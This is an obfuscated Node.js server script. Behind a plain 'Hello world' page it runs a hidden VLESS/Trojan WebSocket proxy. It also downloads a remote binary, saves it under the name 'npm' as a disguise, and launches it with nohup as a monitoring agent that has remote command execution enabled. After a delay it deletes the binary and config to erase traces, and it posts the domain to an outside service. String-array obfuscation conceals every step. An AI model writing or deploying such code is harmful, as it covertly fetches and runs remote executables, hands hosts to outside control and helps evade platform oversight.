const _0x346945=_0x1dc4;(function(_0x2de47e,_0x9bab53){const _0x21cdb2=_0x1dc4,_0x113aca=_0x2de47e();while(!![]){try{const _0x362fc1=parseInt(_0x21cdb2(0x158))/0x1*(-parseInt(_0x21cdb2(0x18c))/0x2)+parseInt(_0x21cdb2(0x184))/0x3+parseInt(_0x21cdb2(0x139))/0x4*(parseInt(_0x21cdb2(0x146))/0x5)+parseInt(_0x21cdb2(0x126))/0x6+parseInt(_0x21cdb2(0x156))/0x7+parseInt(_0x21cdb2(0x18e))/0x8*(parseInt(_0x21cdb2(0x17a))/0x9)+parseInt(_0x21cdb2(0x17e))/0xa*(-parseInt(_0x21cdb2(0x145))/0xb);if(_0x362fc1===_0x9bab53)break;else _0x113aca['push'](_0x113aca['shift']());}catch(_0x143b07){_0x113aca['push'](_0x113aca['shift']());}}}(_0x474d,0xc697b));const os=require('os'),http=require(_0x346945(0x161)),fs=require('fs'),axios=require(_0x346945(0x19a)),net=require(_0x346945(0x14f)),path=require(_0x346945(0x182)),crypto=require(_0x346945(0x176)),{Buffer}=require(_0x346945(0x15f)),{exec,execSync}=require(_0x346945(0x12c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x346945(0x11e)]||_0x346945(0x14a),NEZHA_SERVER=process[_0x346945(0x120)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x346945(0x129)]||'',NEZHA_KEY=process[_0x346945(0x120)][_0x346945(0x185)]||'',DOMAIN=process[_0x346945(0x120)]['DOMAIN']||_0x346945(0x19d),AUTO_ACCESS=process[_0x346945(0x120)][_0x346945(0x17f)]||!![],WSPATH=process[_0x346945(0x120)][_0x346945(0x12b)]||UUID[_0x346945(0x167)](0x0,0x8),SUB_PATH=process['env'][_0x346945(0x195)]||_0x346945(0x17d),NAME=process['env'][_0x346945(0x18f)]||_0x346945(0x14d),PORT=process[_0x346945(0x120)][_0x346945(0x127)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x14703c=_0x346945;try{const _0x3fd76b=await axios['get'](_0x14703c(0x172)),_0x9aeb5f=_0x3fd76b[_0x14703c(0x155)];ISP=(_0x9aeb5f['country']+'-'+_0x9aeb5f[_0x14703c(0x187)])['replace'](/ /g,'_');}catch(_0x153413){ISP=_0x14703c(0x175);}};GetISP();const httpServer=http[_0x346945(0x13d)]((_0x274f49,_0x627731)=>{const _0xf59cc2=_0x346945;if(_0x274f49[_0xf59cc2(0x13e)]==='/'){const _0x254085=path[_0xf59cc2(0x15d)](__dirname,_0xf59cc2(0x15e));fs['readFile'](_0x254085,'utf8',(_0x8e33de,_0x47d234)=>{const _0x2dbc1e=_0xf59cc2;if(_0x8e33de){_0x627731[_0x2dbc1e(0x160)](0xc8,{'Content-Type':_0x2dbc1e(0x168)}),_0x627731['end'](_0x2dbc1e(0x186));return;}_0x627731[_0x2dbc1e(0x160)](0xc8,{'Content-Type':_0x2dbc1e(0x168)}),_0x627731[_0x2dbc1e(0x15a)](_0x47d234);});return;}else{if(_0x274f49['url']==='/'+SUB_PATH){const _0x40c3dc='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x500577='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0xf59cc2(0x179)+DOMAIN+_0xf59cc2(0x133)+WSPATH+'#'+NAME+'-'+ISP,_0x1fb02e=_0x40c3dc+'\x0a'+_0x500577,_0x1630b4=Buffer['from'](_0x1fb02e)[_0xf59cc2(0x157)](_0xf59cc2(0x196));_0x627731[_0xf59cc2(0x160)](0xc8,{'Content-Type':'text/plain'}),_0x627731[_0xf59cc2(0x15a)](_0x1630b4+'\x0a');}else _0x627731['writeHead'](0x194,{'Content-Type':_0xf59cc2(0x136)}),_0x627731[_0xf59cc2(0x15a)](_0xf59cc2(0x125));}}),wss=new WebSocket[(_0x346945(0x191))]({'server':httpServer}),uuid=UUID[_0x346945(0x18d)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x346945(0x18b)];function _0x1dc4(_0x18c85d,_0x3053a2){const _0x474d62=_0x474d();return _0x1dc4=function(_0x1dc442,_0x55ac09){_0x1dc442=_0x1dc442-0x11d;let _0x227d1d=_0x474d62[_0x1dc442];return _0x227d1d;},_0x1dc4(_0x18c85d,_0x3053a2);}function resolveHost(_0x34308c){return new Promise((_0x2956c7,_0x1afb79)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x34308c)){_0x2956c7(_0x34308c);return;}let _0x1a6450=0x0;function _0x1d5d8e(){const _0x3d4d67=_0x1dc4;if(_0x1a6450>=DNS_SERVERS['length']){_0x1afb79(new Error('Failed\x20to\x20resolve\x20'+_0x34308c+_0x3d4d67(0x19e)));return;}const _0x3f7eb0=DNS_SERVERS[_0x1a6450];_0x1a6450++;const _0x221859=_0x3d4d67(0x135)+encodeURIComponent(_0x34308c)+_0x3d4d67(0x137);axios[_0x3d4d67(0x162)](_0x221859,{'timeout':0x1388,'headers':{'Accept':_0x3d4d67(0x141)}})[_0x3d4d67(0x128)](_0x5bd760=>{const _0x3affbf=_0x3d4d67,_0xc04222=_0x5bd760[_0x3affbf(0x155)];if(_0xc04222[_0x3affbf(0x181)]===0x0&&_0xc04222[_0x3affbf(0x19c)]&&_0xc04222[_0x3affbf(0x19c)]['length']>0x0){const _0x291f4f=_0xc04222[_0x3affbf(0x19c)][_0x3affbf(0x13c)](_0x1964fd=>_0x1964fd[_0x3affbf(0x132)]===0x1);if(_0x291f4f){_0x2956c7(_0x291f4f['data']);return;}}_0x1d5d8e();})['catch'](_0x1ab0c3=>{_0x1d5d8e();});}_0x1d5d8e();});}function handleVlessConnection(_0x5602be,_0x15a6b9){const _0x3f8a05=_0x346945,[_0x156366]=_0x15a6b9,_0x124f05=_0x15a6b9[_0x3f8a05(0x167)](0x1,0x11);if(!_0x124f05[_0x3f8a05(0x159)]((_0x127ae8,_0xac0170)=>_0x127ae8==parseInt(uuid[_0x3f8a05(0x150)](_0xac0170*0x2,0x2),0x10)))return![];let _0x510163=_0x15a6b9[_0x3f8a05(0x167)](0x11,0x12)['readUInt8']()+0x13;const _0x343c2e=_0x15a6b9['slice'](_0x510163,_0x510163+=0x2)['readUInt16BE'](0x0),_0x400a31=_0x15a6b9[_0x3f8a05(0x167)](_0x510163,_0x510163+=0x1)[_0x3f8a05(0x16d)](),_0x23dbc8=_0x400a31==0x1?_0x15a6b9[_0x3f8a05(0x167)](_0x510163,_0x510163+=0x4)['join']('.'):_0x400a31==0x2?new TextDecoder()['decode'](_0x15a6b9['slice'](_0x510163+0x1,_0x510163+=0x1+_0x15a6b9[_0x3f8a05(0x167)](_0x510163,_0x510163+0x1)[_0x3f8a05(0x16d)]())):_0x400a31==0x3?_0x15a6b9[_0x3f8a05(0x167)](_0x510163,_0x510163+=0x10)[_0x3f8a05(0x173)]((_0x40ca5c,_0xd6161b,_0x3f9826,_0x2c69ea)=>_0x3f9826%0x2?_0x40ca5c['concat'](_0x2c69ea[_0x3f8a05(0x167)](_0x3f9826-0x1,_0x3f9826+0x1)):_0x40ca5c,[])[_0x3f8a05(0x152)](_0x5b7df5=>_0x5b7df5[_0x3f8a05(0x177)](0x0)[_0x3f8a05(0x157)](0x10))[_0x3f8a05(0x15d)](':'):'';_0x5602be[_0x3f8a05(0x190)](new Uint8Array([_0x156366,0x0]));const _0x23a9fd=createWebSocketStream(_0x5602be);return resolveHost(_0x23dbc8)[_0x3f8a05(0x128)](_0x3c87e1=>{const _0x30a527=_0x3f8a05;net['connect']({'host':_0x3c87e1,'port':_0x343c2e},function(){const _0x185ec9=_0x1dc4;this['write'](_0x15a6b9[_0x185ec9(0x167)](_0x510163)),_0x23a9fd['on'](_0x185ec9(0x198),()=>{})[_0x185ec9(0x138)](this)['on'](_0x185ec9(0x198),()=>{})[_0x185ec9(0x138)](_0x23a9fd);})['on'](_0x30a527(0x198),()=>{});})[_0x3f8a05(0x12d)](_0x2dce59=>{const _0x1dcced=_0x3f8a05;net[_0x1dcced(0x17c)]({'host':_0x23dbc8,'port':_0x343c2e},function(){const _0x5f016f=_0x1dcced;this[_0x5f016f(0x123)](_0x15a6b9[_0x5f016f(0x167)](_0x510163)),_0x23a9fd['on'](_0x5f016f(0x198),()=>{})['pipe'](this)['on'](_0x5f016f(0x198),()=>{})[_0x5f016f(0x138)](_0x23a9fd);})['on'](_0x1dcced(0x198),()=>{});}),!![];}function handleTrojanConnection(_0x2237c7,_0x1addef){const _0x470ec2=_0x346945;try{if(_0x1addef[_0x470ec2(0x144)]<0x3a)return![];const _0x2fd365=_0x1addef[_0x470ec2(0x167)](0x0,0x38)['toString'](),_0x41b45b=[UUID];let _0x4fc37a=null;for(const _0xd414a9 of _0x41b45b){const _0x8e2c21=crypto[_0x470ec2(0x16c)](_0x470ec2(0x124))['update'](_0xd414a9)[_0x470ec2(0x165)](_0x470ec2(0x19b));if(_0x8e2c21===_0x2fd365){_0x4fc37a=_0xd414a9;break;}}if(!_0x4fc37a)return![];let _0x55dc93=0x38;_0x1addef[_0x55dc93]===0xd&&_0x1addef[_0x55dc93+0x1]===0xa&&(_0x55dc93+=0x2);const _0x17e18f=_0x1addef[_0x55dc93];if(_0x17e18f!==0x1)return![];_0x55dc93+=0x1;const _0x4117af=_0x1addef[_0x55dc93];_0x55dc93+=0x1;let _0x2df46e,_0x204dca;if(_0x4117af===0x1)_0x2df46e=_0x1addef[_0x470ec2(0x167)](_0x55dc93,_0x55dc93+0x4)['join']('.'),_0x55dc93+=0x4;else{if(_0x4117af===0x3){const _0x3e50be=_0x1addef[_0x55dc93];_0x55dc93+=0x1,_0x2df46e=_0x1addef[_0x470ec2(0x167)](_0x55dc93,_0x55dc93+_0x3e50be)['toString'](),_0x55dc93+=_0x3e50be;}else{if(_0x4117af===0x4)_0x2df46e=_0x1addef[_0x470ec2(0x167)](_0x55dc93,_0x55dc93+0x10)['reduce']((_0x5343d2,_0x36292d,_0x4bcd57,_0x3a7e5b)=>_0x4bcd57%0x2?_0x5343d2[_0x470ec2(0x149)](_0x3a7e5b[_0x470ec2(0x167)](_0x4bcd57-0x1,_0x4bcd57+0x1)):_0x5343d2,[])[_0x470ec2(0x152)](_0x35dba8=>_0x35dba8['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x55dc93+=0x10;else return![];}}_0x204dca=_0x1addef[_0x470ec2(0x177)](_0x55dc93),_0x55dc93+=0x2;_0x55dc93<_0x1addef[_0x470ec2(0x144)]&&_0x1addef[_0x55dc93]===0xd&&_0x1addef[_0x55dc93+0x1]===0xa&&(_0x55dc93+=0x2);const _0x48ef00=createWebSocketStream(_0x2237c7);return resolveHost(_0x2df46e)[_0x470ec2(0x128)](_0x1afd80=>{const _0x60967=_0x470ec2;net['connect']({'host':_0x1afd80,'port':_0x204dca},function(){const _0x4a3709=_0x1dc4;_0x55dc93<_0x1addef[_0x4a3709(0x144)]&&this[_0x4a3709(0x123)](_0x1addef[_0x4a3709(0x167)](_0x55dc93)),_0x48ef00['on'](_0x4a3709(0x198),()=>{})[_0x4a3709(0x138)](this)['on'](_0x4a3709(0x198),()=>{})[_0x4a3709(0x138)](_0x48ef00);})['on'](_0x60967(0x198),()=>{});})[_0x470ec2(0x12d)](_0x3d40fe=>{const _0x34dad2=_0x470ec2;net[_0x34dad2(0x17c)]({'host':_0x2df46e,'port':_0x204dca},function(){const _0x53cb6c=_0x34dad2;_0x55dc93<_0x1addef[_0x53cb6c(0x144)]&&this[_0x53cb6c(0x123)](_0x1addef[_0x53cb6c(0x167)](_0x55dc93)),_0x48ef00['on'](_0x53cb6c(0x198),()=>{})[_0x53cb6c(0x138)](this)['on']('error',()=>{})[_0x53cb6c(0x138)](_0x48ef00);})['on'](_0x34dad2(0x198),()=>{});}),!![];}catch(_0x3c8c60){return![];}}wss['on'](_0x346945(0x14c),(_0x5e2594,_0x55109d)=>{const _0x2ab221=_0x346945,_0x10a148=_0x55109d[_0x2ab221(0x13e)]||'';_0x5e2594[_0x2ab221(0x147)](_0x2ab221(0x183),_0x566547=>{const _0x2b2dce=_0x2ab221;if(_0x566547[_0x2b2dce(0x144)]>0x11&&_0x566547[0x0]===0x0){const _0x306531=_0x566547[_0x2b2dce(0x167)](0x1,0x11),_0x516485=_0x306531[_0x2b2dce(0x159)]((_0x47f97e,_0x1be70c)=>_0x47f97e==parseInt(uuid[_0x2b2dce(0x150)](_0x1be70c*0x2,0x2),0x10));if(_0x516485){!handleVlessConnection(_0x5e2594,_0x566547)&&_0x5e2594[_0x2b2dce(0x15c)]();return;}}!handleTrojanConnection(_0x5e2594,_0x566547)&&_0x5e2594[_0x2b2dce(0x15c)]();})['on'](_0x2ab221(0x198),()=>{});});const getDownloadUrl=()=>{const _0xe95bb1=_0x346945,_0x22b484=os[_0xe95bb1(0x12a)]();return _0x22b484==='arm'||_0x22b484===_0xe95bb1(0x148)||_0x22b484===_0xe95bb1(0x199)?!NEZHA_PORT?_0xe95bb1(0x134):_0xe95bb1(0x13b):!NEZHA_PORT?_0xe95bb1(0x192):_0xe95bb1(0x19f);},downloadFile=async()=>{const _0xfe31bc=_0x346945;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2f38da=getDownloadUrl(),_0x27478b=await axios({'method':_0xfe31bc(0x162),'url':_0x2f38da,'responseType':_0xfe31bc(0x12f)}),_0xe07273=fs[_0xfe31bc(0x142)](_0xfe31bc(0x189));return _0x27478b[_0xfe31bc(0x155)][_0xfe31bc(0x138)](_0xe07273),new Promise((_0xf256f8,_0x1e4624)=>{const _0x5ecc32=_0xfe31bc;_0xe07273['on'](_0x5ecc32(0x170),()=>{const _0x30df55=_0x5ecc32;console[_0x30df55(0x16f)](_0x30df55(0x180)),exec(_0x30df55(0x188),_0x46c458=>{if(_0x46c458)_0x1e4624(_0x46c458);_0xf256f8();});}),_0xe07273['on'](_0x5ecc32(0x198),_0x1e4624);});}catch(_0x1874d5){throw _0x1874d5;}},runnz=async()=>{const _0x4cf7d3=_0x346945;try{const _0x46b59d=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x4cf7d3(0x143)});if(_0x46b59d[_0x4cf7d3(0x154)]()!==''){console[_0x4cf7d3(0x16f)](_0x4cf7d3(0x171));return;}}catch(_0x11765e){}await downloadFile();let _0x4c9f98='',_0x2c9168=[_0x4cf7d3(0x164),_0x4cf7d3(0x12e),_0x4cf7d3(0x140),_0x4cf7d3(0x122),_0x4cf7d3(0x14e),_0x4cf7d3(0x130)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x58a5c4=_0x2c9168[_0x4cf7d3(0x121)](NEZHA_PORT)?_0x4cf7d3(0x174):'';_0x4c9f98=_0x4cf7d3(0x193)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4cf7d3(0x151)+NEZHA_KEY+'\x20'+_0x58a5c4+_0x4cf7d3(0x13a);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4d4b42=NEZHA_SERVER[_0x4cf7d3(0x121)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xdbef4a=_0x2c9168[_0x4cf7d3(0x121)](_0x4d4b42)?_0x4cf7d3(0x17b):_0x4cf7d3(0x16b),_0x386cfb=_0x4cf7d3(0x153)+NEZHA_KEY+_0x4cf7d3(0x14b)+NEZHA_SERVER+_0x4cf7d3(0x197)+_0xdbef4a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4cf7d3(0x15b)](_0x4cf7d3(0x18a),_0x386cfb);}_0x4c9f98=_0x4cf7d3(0x194);}else{console[_0x4cf7d3(0x16f)](_0x4cf7d3(0x166));return;}}try{exec(_0x4c9f98,{'shell':_0x4cf7d3(0x16e)},_0x3497f5=>{const _0xd6bc73=_0x4cf7d3;if(_0x3497f5)console[_0xd6bc73(0x198)](_0xd6bc73(0x11f),_0x3497f5);else console['log']('npm\x20is\x20running');});}catch(_0x4bf1bd){console['error'](_0x4cf7d3(0x169)+_0x4bf1bd);}};async function addAccessTask(){const _0x4b93e9=_0x346945;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5af5ed=_0x4b93e9(0x131)+DOMAIN;try{const _0x9d43cd=await axios[_0x4b93e9(0x16a)]('https://oooo.serv00.net/add-url',{'url':_0x5af5ed},{'headers':{'Content-Type':'application/json'}});console[_0x4b93e9(0x16f)](_0x4b93e9(0x178));}catch(_0x518066){}}function _0x474d(){const _0x39a189=['createServer','url','Server\x20is\x20running\x20on\x20port\x20','2096','application/dns-json','createWriteStream','utf-8','length','14531WGyobL','5HcgRfB','once','arm64','concat','d6e2cc3b-6297-4fd3-a227-54a5d54a6b09','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','connection','Hug','2083','net','substr','\x20-p\x20','map','client_secret:\x20','trim','data','7601258LmDnjx','toString','432001CdaOfp','every','end','writeFileSync','close','join','index.html','buffer','writeHead','http','get','listen','443','digest','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','slice','text/html','error:\x20','post','false','createHash','readUInt8','/bin/bash','log','finish','npm\x20is\x20already\x20running,\x20skip\x20running...','https://speed.cloudflare.com/meta','reduce','--tls','Unknown','crypto','readUInt16BE','Automatic\x20Access\x20Task\x20added\x20successfully','&fp=chrome&type=ws&host=','153BshGnt','true','connect','1qaz2wsX','16550nCCSBs','AUTO_ACCESS','npm\x20download\x20successfully','Status','path','message','1602624nNnbSC','NEZHA_KEY','Hello\x20world!','asOrganization','chmod\x20+x\x20npm','npm','config.yaml','1.1.1.1','2HGsEwJ','replace','159128TnWgBz','NAME','send','Server','https://amd64.ssss.nyc.mn/v1','setsid\x20nohup\x20./npm\x20-s\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','SUB_PATH','base64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error','aarch64','axios','hex','Answer','1234.abc.com','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/agent','unlink','UUID','npm\x20running\x20error:','env','includes','2087','write','sha224','Not\x20Found\x0a','4631670IMJXrZ','PORT','then','NEZHA_PORT','arch','WSPATH','child_process','catch','8443','stream','2053','https://','type','&path=%2F','https://arm64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','text/plain','&type=A','pipe','2805988eYzXGz','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','find'];_0x474d=function(){return _0x39a189;};return _0x474d();}const delFiles=()=>{const _0x498546=_0x346945;fs[_0x498546(0x11d)](_0x498546(0x189),()=>{}),fs[_0x498546(0x11d)](_0x498546(0x18a),()=>{});};httpServer[_0x346945(0x163)](PORT,()=>{const _0x2cbcae=_0x346945;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x2cbcae(0x13f)+PORT);});
